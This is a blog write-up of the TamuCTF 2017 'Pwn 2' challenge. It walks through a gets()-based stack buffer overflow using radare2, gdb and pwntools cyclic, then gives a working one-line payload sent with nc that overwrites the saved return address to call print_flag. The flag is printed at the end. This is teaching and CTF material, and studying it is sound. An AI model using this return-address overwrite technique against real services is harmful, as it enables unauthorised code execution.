<!DOCTYPE html>
<html>
<head>
    <meta name="generator" content="Hugo 0.30-DEV" />

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="My thoughts and rambles">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    
    <link rel="icon" type="image/png" href="/images/favicon.ico">

    
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" sizes="192x192" href="/images/touch/chrome-touch-icon-192x192.png">

    
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
    <link rel="apple-touch-icon-precomposed" href="apple-touch-icon-precomposed.png">

    
    <meta name="msapplication-TileImage" content="images/touch/ms-touch-icon-144x144-precomposed.png">
    <meta name="msapplication-TileColor" content="#3372DF">

    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en"/>
    <link rel="stylesheet" href="/css/ionicons.min.css"/>
    <link rel="stylesheet" href="https://storage.googleapis.com/code.getmdl.io/1.1.3/material.grey-orange.min.css"/>
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="/css/hmdl-style.css"/>
	<link rel="stylesheet" href="/css/pygment.css">


<script>
window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
ga('create', 'UA-103806632-1', 'auto');
ga('send', 'pageview');
</script>
<script async src='//www.google-analytics.com/analytics.js'></script>


    <title>TamuCTF 2017 - Pwn 2</title>
</head>

<body style="background-image: url('/images/background.jpg');">
    <div id="MainCnt" class="hmdl-body mdl-layout mdl-js-layout has-drawer is-upgraded">        
        <header class="mdl-layout__header mdl-layout__header--transparent mdl-layout__header--scroll">
            <div class="mdl-layout__header-row">
                <div class="mdl-layout-spacer"></div>
                <nav class="mdl-navigation">
                <a class="mdl-navigation__link" href="/">Home</a>
                <a class="mdl-navigation__link" href="/post/">Articles</a>
                <a class="mdl-navigation__link" href="/project/">Projects</a>
                <a class="mdl-navigation__link" href="/about/">About</a>
                </nav>
            </div>
        </header>
        <div class="mdl-layout__drawer">
            <nav class="mdl-navigation">
            <a class="mdl-navigation__link" href="/">Home</a>
            <a class="mdl-navigation__link" href="/post/">Articles</a>
            <a class="mdl-navigation__link" href="/project/">Projects</a>
            <a class="mdl-navigation__link" href="/about/">About</a>
            </nav>
        </div>

        <main class="mdl-layout__content">

		

            <div class="hmdl-page mdl-grid">
                <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
                    <div class="mdl-card__media mdl-color-text--grey-50" style=" background-color:white;">
                        <h3 style="color:orange;">TamuCTF 2017 - Pwn 2</h3>
                    </div>
                    <div class="hmdl-page-meta mdl-color-text--grey-700 mdl-card__supporting-text">
                        <div class="minilogo" style="background-image: url('/images/avatar-64x64.png');"></div>

                        <div>
							<strong>
                            		<strong>Tzaoh</strong>
							</strong>
                            <span>Aug 9, 2017</span>
                        </div>
                        <div class="section-spacer"></div>
                    </div>
                    <div class="hmdl-page-content mdl-color-text--grey-700 mdl-card__supporting-text">
                        

<p><img src="/assets/TamuCTF2017/pwn2/1-pwn2_description.png" alt="Pwn2 challenge description" /></p>

<p>We are given a source code file and a binary which is being run remotely.
Let&rsquo;s a analyze it with radare2:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ wget https://github.com/BlackHoods/BlackHoods.github.io/raw/master/assets/TamuCTF2017/pwn2/pwn2
</span><span class="">$ r2 pwn2</span></code></pre>
</div>
<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x08048450]&gt; aaa
</span><span class="">[x] Analyze all flags starting with sym. and entry0 (aa)
</span><span class="">[x] Analyze len bytes of instructions for references (aar)
</span><span class="">[x] Analyze function calls (aac)
</span><span class="">[x] Use -AA or aaaa to perform additional experimental analysis.
</span><span class="">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
</span><span class="">[0x08048450]&gt; afl
</span><span class="">0x08048390    3 35           sym._init
</span><span class="">0x080483b3    1 25           fcn.080483b3
</span><span class="">0x080483cc    1 4            sub.gets_12_3cc
</span><span class="">0x080483d0    1 6            sym.imp.gets
</span><span class="">0x080483d6    2 10   -&gt; 22   fcn.080483d6
</span><span class="">0x080483e0    1 6            sym.imp._IO_getc
</span><span class="">0x080483e6    2 10   -&gt; 22   fcn.080483e6
</span><span class="">0x080483f0    1 6            sym.imp.puts
</span><span class="">0x080483f6    2 10   -&gt; 22   fcn.080483f6
</span><span class="">0x08048400    1 6            sym.imp.__libc_start_main
</span><span class="">0x08048406    2 10   -&gt; 22   fcn.08048406
</span><span class="">0x08048410    1 6            sym.imp.setvbuf
</span><span class="">0x08048416    2 10   -&gt; 22   fcn.08048416
</span><span class="">0x08048420    1 6            sym.imp.fopen
</span><span class="">0x08048426    2 10   -&gt; 22   fcn.08048426
</span><span class="">0x08048430    1 6            sym.imp.putchar
</span><span class="">0x08048436    2 10   -&gt; 22   fcn.08048436
</span><span class="">0x08048440    1 1            sub.__gmon_start___252_440
</span><span class="">0x08048441    1 15           fcn.08048441
</span><span class="">0x08048450    1 33           entry0
</span><span class="">0x08048471    1 1            fcn.08048471
</span><span class="">0x08048480    1 4            sym.__x86.get_pc_thunk.bx
</span><span class="">0x08048490    4 43           sym.deregister_tm_clones
</span><span class="">0x080484bc    4 57           fcn.080484bc
</span><span class="">0x080484f5    3 41           fcn.080484f5
</span><span class="">0x08048520    8 43   -&gt; 93   sym.frame_dummy
</span><span class="hl"><span class="">0x0804854b    4 103          sym.print_flag
</span></span><span class="hl"><span class="">0x080485b2    1 84           sym.echo
</span></span><span class="hl"><span class="">0x08048606    1 36           sym.main
</span></span><span class="">0x08048630    4 93           sym.__libc_csu_init
</span><span class="">0x0804868d    1 5            fcn.0804868d
</span><span class="">0x08048692    1 22           fcn.08048692</span></code></pre>
</div>

<p>We can see similar functions to the <a href="/post/tamuctf2017/pwn1/">previous</a> pwning challenge, but there a complication here: if we look closely&hellip;</p>
<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x080485c0]&gt; s sym.print_flag 
</span><span class="">[0x0804854b]&gt; axt
</span><span class="">[0x0804854b]&gt;</span></code></pre>
</div>
<p>On the contrary to the pwn1 challenge <code>print_flag</code> function (which is responsible for printing the flag stored in <code>flag.txt</code>) is <strong>never</strong> called!<br />
Instead a new function named <code>echo</code> is called from <code>main</code> function.</p>

<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x08048450]&gt; pdf @ main
</span><span class="">            ;-- main:
</span><span class="">┌ (fcn) sym.main 36
</span><span class="">│   sym.main ();
</span><span class="">│           ; var int local_4h @ esp+0x4
</span><span class="">│              ; DATA XREF from 0x08048467 (entry0)
</span><span class="">│           0x08048606      8d4c2404       ecx = [local_4h]
</span><span class="">│           0x0804860a      83e4f0         esp &amp;= 0xfffffff0
</span><span class="">│           0x0804860d      ff71fc         push dword [ecx - 4]
</span><span class="">│           0x08048610      55             push ebp
</span><span class="">│           0x08048611      89e5           ebp = esp
</span><span class="">│           0x08048613      51             push ecx
</span><span class="">│           0x08048614      83ec04         esp -= 4
</span><span class="hl"><span class="">│           0x08048617      e896ffffff     sym.echo ()
</span></span><span class="">│           0x0804861c      b800000000     eax = 0
</span><span class="">│           0x08048621      83c404         esp += 4
</span><span class="">│           0x08048624      59             pop ecx
</span><span class="">│           0x08048625      5d             pop ebp
</span><span class="">│           0x08048626      8d61fc         esp = [ecx - 4]
</span><span class="">└           0x08048629      c3             </span></code></pre>
</div>

<p>Lets see what it does:</p>

<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x08048450]&gt; pdf @ sym.echo
</span><span class="">┌ (fcn) sym.echo 84
</span><span class="">│   sym.echo ();
</span><span class="">│           ; var int local_88h @ ebp-0x88
</span><span class="">│              ; CALL XREF from 0x08048617 (sym.main)
</span><span class="">│           0x080485b2      55             push ebp
</span><span class="">│           0x080485b3      89e5           ebp = esp
</span><span class="">│           0x080485b5      81ec88000000   esp -= 0x88
</span><span class="">│           0x080485bb      a130a00408     eax = dword obj.stdout
</span><span class="">│           0x080485c0      6a00           push 0
</span><span class="">│           0x080485c2      6a00           push 0
</span><span class="">│           0x080485c4      6a02           push 2
</span><span class="">│           0x080485c6      50             push eax
</span><span class="">│         ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
</span><span class="">│           0x080485c7      e844feffff     sym.imp.setvbuf ()
</span><span class="">│           0x080485cc      83c410         esp += 0x10
</span><span class="">│           0x080485cf      83ec0c         esp -= 0xc
</span><span class="">│           0x080485d2      68dd860408     push str.Enter_a_word_to_be_echoed:
</span><span class="">│         ; int puts(const char *s)
</span><span class="hl"><span class="">│           0x080485d7      e814feffff     sym.imp.puts ()             
</span></span><span class="">│         ; int puts(const char * s)
</span><span class="">│           0x080485dc      83c410         esp += 0x10
</span><span class="">│           0x080485df      83ec0c         esp -= 0xc
</span><span class="">│           0x080485e2      8d8578ffffff   eax = [local_88h]
</span><span class="">│           0x080485e8      50             push eax
</span><span class="">│         ; char*gets(char *s)
</span><span class="">│           0x080485e9      e8e2fdffff     sym.imp.gets ()             
</span><span class="">│           0x080485ee      83c410         esp += 0x10
</span><span class="">│           0x080485f1      83ec0c         esp -= 0xc
</span><span class="">│           0x080485f4      8d8578ffffff   eax = [local_88h]
</span><span class="">│           0x080485fa      50             push eax
</span><span class="">│         ; int puts(const char *s)
</span><span class="">│           0x080485fb      e8f0fdffff     sym.imp.puts ()
</span><span class="">│           0x08048600      83c410         esp += 0x10
</span><span class="">│           0x08048603      90
</span><span class="">│           0x08048604      c9
</span><span class="">└           0x08048605      c3</span></code></pre>
</div>

<p>Ok, so aparently it just prints back whatever you input before. But hey! To read your input it uses <code>gets</code> insecure function again!  That means we can write beyond the allocated memory of our input.</p>

<blockquote>
<p>All right, but this case is not like the previous one!<br />
We do not want to change the value of a variable, but to call an existent function!<br />
Is it possible?</p>
</blockquote>

<p>Hell yeah! but to know how, we first need to understand how the stack is affected when calling a function (<code>sym.echo</code> in this case).
When a function is going to be called, some data is pushed on top of the stack. Among other things, the EIP register is stored.</p>

<blockquote>
<p>Why this register? Why is it special?</p>
</blockquote>

<p>The purpose of EIP register (or instruction pointer) is to indicate the CPU which instruction has to be executed after the current one. When the <code>echo</code> function finishes, the CPU will need to continue the execution right after the call.<br />
Like this:</p>

<p><img src="/assets/TamuCTF2017/pwn2/4-pwn2_normal_flow.png" alt="Pwn2 Normal execution flow" /></p>

<p>And the stack will look like:</p>

<p><img src="/assets/TamuCTF2017/pwn2/5-pwn2_stack_view.png" alt="Pwn2 Stack view on echo call" /></p>

<p>Nice ✌️!, looking at the stack we realize we could just write a bunch of bytes until we reach the <code>Saved EIP</code> value!</p>

<blockquote>
<p>Okay but &hellip; how many bytes do we have to write?</p>
</blockquote>

<p>Well, in this case we can calculate it like <code>0x88h + 4d(EBP length) = 140d</code>, but lets calculate another way: using gdb (GNU Debugger).</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;A&#34;*500)&#39;</span><span class=""> &gt; input.txt    </span><span class="c1"># Generate and save a long string in a text file.                     
</span><span class="c1"></span><span class="">$ gdb -q pwn2                               </span><span class="c1"># Open the binary with gdb.
</span><span class="c1"></span><span class="">Reading symbols from pwn2...</span><span class="o">(</span><span class="">no debugging symbols found</span><span class="o">)</span><span class="">...done.
</span><span class=""></span><span class="o">(</span><span class="">gdb</span><span class="o">)</span><span class=""> run &lt; input.txt                       </span><span class="c1"># Run the binary with the generated string.
</span><span class="c1"></span><span class="">Starting program: pwn2 &lt; input.txt
</span><span class="">Enter a word to be echoed:
</span><span class="">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class="">
</span><span class="">Program received signal SIGSEGV, Segmentation fault.
</span><span class="">0x41414141 in ?? </span><span class="o">()</span><span class="">
</span><span class=""></span><span class="o">(</span><span class="">gdb</span><span class="o">)</span></code></pre>
</div>
<p>We ran the binary with gdb and passed 500 &ldquo;A&rdquo;s as input.
That <code>0x41414141</code> means that we have overwritten EIP register with value &ldquo;AAAA&rdquo; and the process crashed when it tried to execute the instrucction of that address (obviously there is nothing there).</p>

<p>So now we could just create a custom string like &ldquo;abcdef&hellip;.&rdquo; to figure out which part of the string is being used to overwrite the EIP &hellip; OR we can use a script which generates it for us 😁.</p>

<p>Now is when is handy to know <code>pwntools</code> utils for python (to install just do
<code>pip install pwntools</code>) and more specifically its
<code>cyclic</code> utility. <code>cyclic</code> is able to generate a sequence of unique substrings of any length (4 by default).</p>

<p>Lets try it!</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ pwn cyclic </span><span class="m">500</span><span class=""> &gt; input.txt  </span><span class="c1"># String of 500 chars with unique substrings of 4 characters.
</span><span class="c1"></span><span class="">$ gdb -q pwn2
</span><span class="">Reading symbols from pwn2...</span><span class="o">(</span><span class="">no debugging symbols found</span><span class="o">)</span><span class="">...done.
</span><span class=""></span><span class="o">(</span><span class="">gdb</span><span class="o">)</span><span class=""> run &lt; input.txt 
</span><span class="">Starting program: pwn2 &lt; input.txt
</span><span class="">Enter a word to be echoed:
</span><span class="">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
</span><span class="">
</span><span class="">Program received signal SIGSEGV, Segmentation fault.
</span><span class="">0x6261616b in ?? </span><span class="o">()</span><span class="">
</span><span class=""></span><span class="o">(</span><span class="">gdb</span><span class="o">)</span><span class=""> </span></code></pre>
</div>
<p>To check that value we do:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ pwn cyclic -l 0x6261616b
</span><span class=""></span><span class="m">140</span></code></pre>
</div>
<p>And finally, after those 140 characters we can write an address to continue the execution. Which address? the address of the <code>print_flag</code> function, of course! The new execution flow will look like this:</p>

<p><img src="/assets/TamuCTF2017/pwn2/8-pwn2_modified_flow.png" alt="Pwn2 Modified execution flow" /></p>

<p>Lets get our flag:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;A&#34;*140 + &#34;\x4b\x85\x04\x08&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> nc pwn.ctf.tamu.edu </span><span class="m">4321</span><span class=""> 
</span><span class="">Enter a word to be echoed:
</span><span class="">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK�
</span><span class="">This </span><span class="k">function</span><span class=""> has been deprecated
</span><span class="">gigem</span><span class="o">{</span><span class="">D34D_FUNC_R1S1NG</span><span class="o">}</span></code></pre>
</div>
<p>Answer: gigem{D34D_FUNC_R1S1NG}</p>

<h3 id="complete-video">Complete video</h3>

<p><a href="https://asciinema.org/a/e8oyx42bm4nbs5stm33o4x24s?autoplay=1"><img src="https://asciinema.org/a/e8oyx42bm4nbs5stm33o4x24s.png" width="400"/></a></p>

<h3 id="tools-used">Tools used:</h3>

<ul>
<li><a href="https://github.com/radare/radare2">radare2</a> - To analyze the binary.</li>
<li><a href="https://www.gnu.org/software/gdb/">gdb</a> - For binary debugging.</li>
<li><a href="https://github.com/Gallopsled/pwntools">pwntools</a> and <a href="http://docs.pwntools.com/en/stable/util/cyclic.html#pwnlib.util.cyclic.cyclic">cyclic</a> - To generate unique substrings.</li>
<li><a href="https://www.draw.io/">draw.io</a> - To draw some graphics.</li>
<li><a href="https://asciinema.org">asciinema</a> - To record the session.</li>
</ul>

                    </div>
                    <div class="hmdl-page-comments mdl-color-text--primary-contrast mdl-card__supporting-text comments"> 
                        <strong>
                            	<strong>Tzaoh</strong>
						</strong>
                        <p></p>
                    </div>  
                </div>                
                <nav class="mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
                    <a href="/post/tamuctf2017/pwn1/">
                        <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                        <i class="icon ion-android-arrow-back"></i>
                        </button>
                        Older
                    </a>
                    <div class="section-spacer"></div>
                    <a href="/post/tamuctf2017/pwn3/">
                        Newer
                        <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                            <i class="icon ion-android-arrow-forward"></i>
                        </button>
                    </a>
                </nav>
 
            </div>        
        </main>
        <footer class="mdl-mini-footer">
            <div class="mdl-mini-footer--left-section">                
                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="mailto:Firstname@example.com?subject=Hi">
                    <i class="material-icons_lg icon ion-email"></i>
                    <span class="visuallyhidden">Email</span>
                </a>
                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="https://github.com/BlackHoods">
                    <i class="material-icons_lg icon ion-social-github"></i>
                    <span class="visuallyhidden">Github</span>
                </a>
                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="https://twitter.com/firstname_lastname">
                    <i class="material-icons_lg icon ion-social-twitter "></i>
                    <span class="visuallyhidden">Twitter</span>
                </a>


            </div>
            <div class="mdl-mini-footer--right-section">
                <span>© 2017 </span>
            </div>
        </footer>
        <div class="mdl-layout__obfuscator"></div>
    </div>
    <script src="https://code.getmdl.io/1.1.3/material.min.js"></script>


</body>
</html>

